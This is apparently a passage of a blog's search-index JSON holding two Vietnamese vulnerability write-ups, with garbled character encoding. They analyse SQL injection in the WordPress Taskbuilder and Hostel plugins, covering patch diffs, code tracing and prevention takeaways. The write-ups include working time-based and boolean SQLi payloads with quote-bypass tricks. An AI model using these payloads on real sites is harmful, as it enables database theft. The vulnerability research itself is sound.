ob_get_clean(); // Báº¯t Ä‘áº§u buffer Ä‘á»ƒ táº¡o pháº§n footer cá»§a modal ob_start(); // ... render HTML cÃ¡c nÃºt thao tÃ¡c (Close, Save) $footer = ob_get_clean(); // Tráº£ dá»¯ liá»‡u JSON Ä‘á»ƒ frontend hiá»ƒn thá»‹ modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); $proj_id / $project: Láº¥y dá»¯ liá»‡u project tá»« database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vÃ¬ xuáº¥t trá»±c tiáº¿p, giÃºp gom ná»™i dung vÃ o biáº¿n. $body / $footer: Chá»©a ná»™i dung HTML Ä‘á»™ng cá»§a modal. json_encode(): Tráº£ JSON cho client, cÃ³ kháº£ nÄƒng Ä‘Æ°á»£c sá»­ dá»¥ng trong Ajax Ä‘á»ƒ hiá»ƒn thá»‹ modal mÃ  khÃ´ng cáº§n refresh trang. File náº±m trong thÆ° má»¥c includes cho tháº¥y ráº±ng nÃ³ sáº½ Ä‘Æ°á»£c gá»i á»Ÿ 1 chá»©c nÄƒng nÃ o Ä‘Ã³ á»Ÿ nÆ¡i khÃ¡c. Äá»ƒ biáº¿t chá»©c nÄƒng nÃ o sá»­ dá»¥ng nÃ³, ta tÃ¬m kiáº¿m vá»›i tá»« khÃ³a get_users.php trong thÆ° má»¥c chá»©a plugin.\nğŸ‘‰ NÃ³ Ä‘Æ°á»£c include trong hÃ m wppm_get_users() cá»§a class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() lÃ  callback cá»§a action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. wp_ajax_wppm_get_users lÃ  tÃªn hook Ajax, vá»›i quy táº¯c Ä‘áº·t tÃªn: wp_ajax_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user Ä‘Ã£ Ä‘Äƒng nháº­p. wp_ajax_nopriv_{action} =\u0026gt; Xá»­ lÃ½ Ajax khi user chÆ°a Ä‘Äƒng nháº­p. á» Ä‘Ã¢y, action = wppm_get_users. NghÄ©a lÃ  náº¿u trong Ajax request báº¡n gá»­i action=wppm_get_users tá»›i admin-ajax.php, thÃ¬ WordPress sáº½ tÃ¬m callback tÆ°Æ¡ng á»©ng Ä‘á»ƒ xá»­ lÃ½, á»Ÿ Ä‘Ã¢y lÃ  wppm_get_users(). ğŸ‘‰ Ta Ä‘Ã£ biáº¿t Ä‘Æ°á»£c action = wppm_get_users, kiá»ƒm tra xem Ajax nÃ o sá»­ dá»¥ng action nÃ y báº±ng cÃ¡ch tÃ¬m tá»« khÃ³a wppm_get_users trÃªn cÃ¡c file .js trong thÆ° má»¥c chá»©a plugin.\nAction wppm_get_users lÃ  pháº§n data trong request POST cá»§a hÃ m wppm_get_users()\nHÃ m wppm_get_users() sáº½ Ä‘Æ°á»£c Ä‘áº·t trong HTML attribute cá»§a chá»©c nÄƒng project\nTáº¡o project má»›i Truy cáº­p vÃ o project Ä‘Ã³ Inspect code vÃ  tÃ¬m hÃ m wppm_get_users sáº½ Ä‘Æ°á»£c Ä‘áº·t á»Ÿ Ä‘Ã¢u, hÃ nh Ä‘á»™ng nÃ o sáº½ gá»i nÃ³ ğŸ‘‰ Khi click vÃ o icon bÃªn cáº¡nh Users ajax sáº½ hoáº¡t Ä‘á»™ng, gá»­i request Ä‘áº¿n server, láº¥y danh sÃ¡ch cÃ¡c user tham gia project vÃ  mÃ£ HTML hiá»ƒn thá»‹ nÃ³.\nExploit Detect SQLi Báº¯t request báº±ng BurpSuite, gá»­i request vá»›i SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nGet First Letter of Database Name Äiá»u kiá»‡n tiÃªn quyáº¿t Ä‘á»ƒ dump Ä‘Æ°á»£c háº¿t data lÃ  pháº£i dump Ä‘Æ°á»£c 1 kÃ½ tá»± báº¥t ká»³ cá»§a tÃªn database, náº¿u láº¥y Ä‘Æ°á»£c thÃ¬ toÃ n bá»™ data Ä‘á»u dump Ä‘Æ°á»£c.\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id Ä‘Ãºng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name Ä‘Æ°á»£c tÃ´i Ä‘áº·t tÃªn lÃ  wordpress nÃªn kÃ­ tá»± Ä‘áº§u tiÃªn lÃ  w tÆ°Æ¡ng á»©ng vá»›i mÃ£ HEX lÃ  0x77\nSá»­ dá»¥ng SUBSTRING(STRING,1,1) Ä‘á»ƒ láº¥y kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a chuá»—i\ná» Ä‘Ã¢y, $proj_id báº±ng 4 vÃ¬ SUBSTRING('wordpress',1,1)=0x77 lÃ  Ä‘Ãºng nÃªn SELECT láº¥y giÃ¡ trá»‹ Ä‘Ãºng trong IF(condition, value if true, value if false), 4 lÃ  giÃ¡ trá»‹ cÃ³ thá»±c trong database, nÃªn response tráº£ vá» chá»©a danh sÃ¡ch ngÆ°á»i tham gia dá»± Ã¡n\nSá»­ dá»¥ng HEX technique Ä‘á»ƒ bypass hÃ m esc_sql() á»Ÿ trÃªn, dÃ¹ng Ä‘á»ƒ so sÃ¡nh khi khÃ´ng sá»­ dÃ¹ng Ä‘Æ°á»£c '\nGá»­i request vá»›i SQLi payload boolean base vÃ³i proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Vá»›i proj_id khÃ´ng cÃ³ thá»±c trong database, response sáº½ tráº£ vá» káº¿t quáº£ chá»©a None\nğŸ‘‰ Ta Ä‘Ã£ láº¥y Ä‘Æ°á»£c kÃ­ tá»± Ä‘áº§u tiÃªn cá»§a database name báº±ng ká»¹ thuáº­t boolean base\nproj_id Ä‘Ã¹ng: response khÃ´ng chá»©a None proj_id sai: response chá»©a None CÃ³ thá»ƒ sá»­ dá»¥ng ká»¹ thuáº­t time base nhÆ°ng khi dump sá»‘ lÆ°á»£ng lá»›n data, thá»i gian dump sáº½ ráº¥t lÃ¢u\nConclusion Lá»— há»•ng CVE-2025-39569 trong plugin WordPress Taskbuilder xuáº¥t phÃ¡t tá»« viá»‡c thiáº¿u dáº¥u nhÃ¡y Ä‘Æ¡n '...' bao quanh dá»¯ liá»‡u Ä‘áº§u vÃ o trong cÃ¢u lá»‡nh SQL, khiáº¿n dá»¯ liá»‡u ngÆ°á»i dÃ¹ng cÃ³ thá»ƒ Ä‘Æ°á»£c diá»…n giáº£i nhÆ° má»™t pháº§n cá»§a cÃ¢u lá»‡nh SQL há»£p lá»‡.\nBáº£n vÃ¡ á»Ÿ phiÃªn báº£n 4.0.2 Ä‘Ã£ kháº¯c phá»¥c váº¥n Ä‘á» báº±ng cÃ¡ch Ä‘Æ°a $proj_id vÃ o trong '...', Ä‘áº£m báº£o nÃ³ luÃ´n Ä‘Æ°á»£c xá»­ lÃ½ nhÆ° má»™t literal string trong SQL.\nKey takeaways:\nÆ¯u tiÃªn sá»­ dá»¥ng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vÃ¬ tá»± chÃ¨n dá»¯ liá»‡u vÃ o query. Äá»‘i vá»›i cÃ¡c plugin WordPress, cáº§n test ká»¹ lÆ°á»¡ng cÃ¡c Ajax endpoint vÃ¬ Ä‘Ã¢y lÃ  nÆ¡i dá»… xuáº¥t hiá»‡n SQLi vÃ  XSS nháº¥t. NgÆ°á»i quáº£n trá»‹ cáº§n thÆ°á»ng xuyÃªn cáº­p nháº­t plugin/theme Ä‘á»ƒ nháº­n báº£n vÃ¡ ká»‹p thá»i. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003cp\u003eLá»— há»•ng xáº£y ra trÃªn plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e cá»§a WordPress trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e4.0.2\u003c/strong\u003e. Äiá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u cá»§a báº¡n, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) vÃ  v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ tháº¥y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eá»¨ng dá»¥ng Ä‘Ã£ \u003cstrong\u003exá»­ lÃ½ dá»¯ liá»‡u Ä‘áº§u vÃ o\u003c/strong\u003e trÆ°á»›c khi Ä‘Æ°a vÃ o cÃ¢u SQL. Tuy nhiÃªn, trong quÃ¡ trÃ¬nh xÃ¢y dá»±ng truy váº¥n, giÃ¡ trá»‹ nÃ y Ä‘Æ°á»£c chÃ¨n trá»±c tiáº¿p mÃ  khÃ´ng Ä‘Æ°á»£c bao trong dáº¥u nhÃ¡y Ä‘Æ¡n \u003ccode\u003e'...'\u003c/code\u003e. Äiá»u Ä‘Ã³ khiáº¿n káº» táº¥n cÃ´ng cÃ³ thá»ƒ chÃ¨n thÃªm cÃ¡c thÃ nh pháº§n cÃº phÃ¡p SQL há»£p lá»‡ (nhÆ° \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vÃ o truy váº¥n, dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lá»— há»•ng trong plugin Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) vÃ  v1.1.5.7(fix) diff tool: meld hoáº·c báº¥t cá»© tool nÃ o cÃ³ thá»ƒ compare Ä‘á»ƒ thÃ¡y Ä‘Æ°á»£c sá»± khÃ¡c biá»‡t giá»¯a 2 version Analysis NguyÃªn nhÃ¢n cá»‘ lÃµi do á»©ng dá»¥ng chÃ¨n trá»±c tiáº¿p dá»¯ liá»‡u tá»« GET request vÃ o SQL query mÃ  cÆ¡ cháº¿ kiá»ƒm soÃ¡t khÃ´ng cháº·t cháº½.\nPatch Diff DÃ¹ng diff tool báº¥t kÃ¬ Ä‘á»ƒ so sÃ¡nh sá»± khÃ¡c biá»‡t giá»¯a báº£n lá»—i vÃ  báº£n vÃ¡. CÃ³ sá»± khÃ¡c biá»‡t rÃµ á»Ÿ file controllers/bookings.php\nBáº£n lá»— há»•ng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Báº£n vÃ¡:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } ğŸ‘‰ Báº£n vÃ¡ sá»­ dá»¥ng whitelist Ä‘á»ƒ giá»›i háº¡n cÃ¡c cá»™t cÃ³ thá»ƒ Ä‘Æ°á»£c sáº¯p xáº¿p, náº¿u khÃ´ng há»£p lá»‡ tráº£ vá» 'tB.id'.\nAnalysis: Lá»— há»•ng xuáº¥t hiá»‡n khi param ob Ä‘Æ°á»£c truyá»n trá»±c tiáº¿p vÃ o má»‡nh Ä‘á» ORDER BY thÃ´ng qua hÃ m sanitize_text_field(), chá»‰ escape mÃ  khÃ´ng filter SQLi.\nHow it work? Äá»ƒ inject Ä‘Æ°á»£c, ta cáº§n pháº£i xÃ¡c Ä‘á»‹nh toÃ n bá»™ cÃ¢u query Ä‘Æ°á»£c Ä‘Æ°á»£c sá»­ dá»¥ng á»Ÿ Ä‘Ã¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); CÃ¢u query náº±m trong nhÃ¡nh default cá»§a cáº¥u trÃºc switch.\nToÃ n bá»™ Ä‘oáº¡n xá»­ lÃ½ naá»³ thuá»™c vá» hÃ m static manage() cá»§a class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiáº¿p vá»›i core thÃ´ng qua Plugin API (Hook System). Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m manage() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a \u0026quot;manage\u0026quot; trong thÆ° má»¥c chá»©a plugin.\nTrong file models/hostel.php ta cÃ³ hÃ m:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } á» Ä‘Ã¢y:\nadd_menu_page() táº¡o menu chÃ­nh trong Admin Dashboard. add_submenu_page() thÃªm cÃ¡c submenu con cho menu Ä‘Ã³. Tham sá»‘ $callback lÃ  má»™t callback function sáº½ Ä‘Æ°á»£c gá»i khi ngÆ°á»i dÃ¹ng click vÃ o menu/submenu. VÃ­ dá»¥:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Táº¥t cáº£ menu/submenu nÃ y Ä‘á»u Ä‘Æ°á»£c Ä‘Äƒng kÃ½ bÃªn trong hÃ m static menu() cá»§a class WPHostel. Do Ä‘Ã³, Ä‘á»ƒ xÃ¡c Ä‘á»‹nh nÆ¡i hÃ m menu() Ä‘Æ°á»£c gá»i, ta cÃ³ thá»ƒ tÃ¬m kiáº¿m tá»« khÃ³a menu trong thÆ° má»¥c chá»©a plugin.\nTrong file hostel.php á»Ÿ thÆ° má»¥c gá»‘c cá»§a plugin ta cÃ³:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() lÃ  má»™t Plugin API cá»§a WordPress, cho phÃ©p gáº¯n má»™t callback vÃ o má»™t action hook. Hook name á»Ÿ Ä‘Ã¢y lÃ  admin_menu, nghÄ©a lÃ  hÃ m WPHostel::menu() sáº½ Ä‘Æ°á»£c gá»i trong vÃ²ng Ä‘á»i khi WordPress dá»±ng Admin Dashboard Menu. Menu trÃªn UI Admin Dashboard\nDebugging\nChá»©c nÄƒng bá»‹ lá»—i náº±m trong Booking Manager, vÃ¬ váº­y ta truy cáº­p vÃ o submenu Manager Bookings trÃªn UI Admin Dashboard. Ngay trÆ°á»›c nhÃ¡nh default cÃ³ comment // list bookings =\u0026gt; cho tháº¥y Ä‘oáº¡n code nÃ y xá»­ lÃ½ viá»‡c liá»‡t kÃª vÃ  sáº¯p xáº¿p bookings Má»Ÿ debugger: Click Run with Debugger. Äáº·t breakpoint táº¡i nhÃ¡nh switch chá»©a code lá»—i vÃ  táº¡i dÃ²ng code gÃ¢y lá»—i. Khi click vÃ o má»™t cá»™t trong báº£ng bookings, quan sÃ¡t: Debugger nháº£y vÃ o cáº¥u trÃºc switch. DÃ¹ng Step Over, debugger Ä‘i tiáº¿p vÃ o nhÃ¡nh default. Tiáº¿p tá»¥c Step Over vÃ  theo dÃµi giÃ¡ trá»‹ biáº¿n trong tab Variables \u0026gt; Locals. CÃ¡c biáº¿n nÃ y sáº½ káº¿t há»£p Ä‘á»ƒ táº¡o thÃ nh cÃ¢u SQL bÃªn dÆ°á»›i. Sau khi ghÃ©p cÃ¡c biáº¿n, cÃ¢u query Ä‘áº§y Ä‘á»§ cÃ³ dáº¡ng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... ÄÃ¡ng chÃº Ã½, biáº¿n $orderby Ä‘Æ°á»£c gÃ¡n nhÆ° sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } âš ï¸ á» Ä‘Ã¢y cÃ³ Ä‘iá»ƒm báº¥t thÆ°á»ng:\nPháº§n sau ORDER BY sá»­ dá»¥ng sanitize_text_field(). HÃ m nÃ y chá»‰ lÃ m sáº¡ch HTML, khÃ´ng há» filter hoáº·c validate Ä‘á»ƒ Ä‘áº£m báº£o an toÃ n trong SQL context. Tham sá»‘ ob (do ngÆ°á»i dÃ¹ng truyá»n vÃ o) vÃ¬ váº­y cÃ³ thá»ƒ bá»‹ lá»£i dá»¥ng Ä‘á»ƒ chÃ¨n trá»±c tiáº¿p vÃ o cÃ¢u SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tÃ¡ch má»‡nh Ä‘á» ORDER BY báº±ng , vÃ¬ nÃ³ cháº¥p nháº­p multi column\nKáº¿t quáº£: thá»i gian pháº£n há»“i bá»‹ delay =\u0026gt; SQL Injection thÃ nh cÃ´ng.\nDump Data from Database Bypass ' using ORD():\nÄá»ƒ dump dá»¯ liá»‡u cá»§a database ta cáº§n thá»­ Ä‘á»ƒ láº¥y kÃ½ tá»± Ä‘áº§u tiÃªn cá»§a database name.\nDo sanitize_text_field() loáº¡i bá» ', ta khÃ´ng dÃ¹ng Ä‘Æ°á»£c payload so sÃ¡nh trá»±c tiáº¿p. Thay vÃ o Ä‘Ã³ dÃ¹ng ORD() Ä‘á»ƒ so sÃ¡nh kÃ½ tá»± theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nBypass ' using Hex encoding (extend)\nNgoÃ i ORD() ta cÃ³ thá»ƒ sá»­ dá»¥ng Hex encoding Ä‘á»ƒ bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 ThÃ nh cÃ´ng bypass =\u0026gt; cÃ³ thá»ƒ trÃ­ch xuáº¥t tÃªn database.\nConclusion Lá»— há»•ng CVE-2025-39566 trong plugin WordPress Hostel trÆ°á»›c phiÃªn báº£n 1.1.5.7, xuáº¥t phÃ¡t tá»« viá»‡c truyá»n trá»±c tiáº¿p input tá»« ngÆ°á»i dÃ¹ng vÃ o SQL query mÃ  khÃ´ng cÃ³ biá»‡n phÃ¡p kiá»ƒm soÃ¡t cháº·t cháº½ dáº«n Ä‘áº¿n lá»— há»•ng SQL Injection.\nKey takeaways:\nsanitize_text_field() â‰  chá»‘ng SQL Injection Cáº§n phÃ¢n biá»‡t rÃµ: lá»c input cho HTML vs cho SQL References SQL Injection Cheat Sheet â€“ PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLá»— há»•ng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trÆ°á»›c phiÃªn báº£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do viá»‡c lÃ m sáº¡ch dá»¯ liá»‡u khÃ´ng Ä‘Ãºng cÃ¡ch, Ä‘iá»u nÃ y cÃ³ thá»ƒ cho phÃ©p káº» táº¥n cÃ´ng trá»±c tiáº¿p tÆ°Æ¡ng tÃ¡c vá»›i cÆ¡ sá»Ÿ dá»¯ liá»‡u, bao gá»“m khÃ´ng giá»›i háº¡n á»Ÿ viá»‡c Ä‘Ã¡nh cáº¯p thÃ´ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and 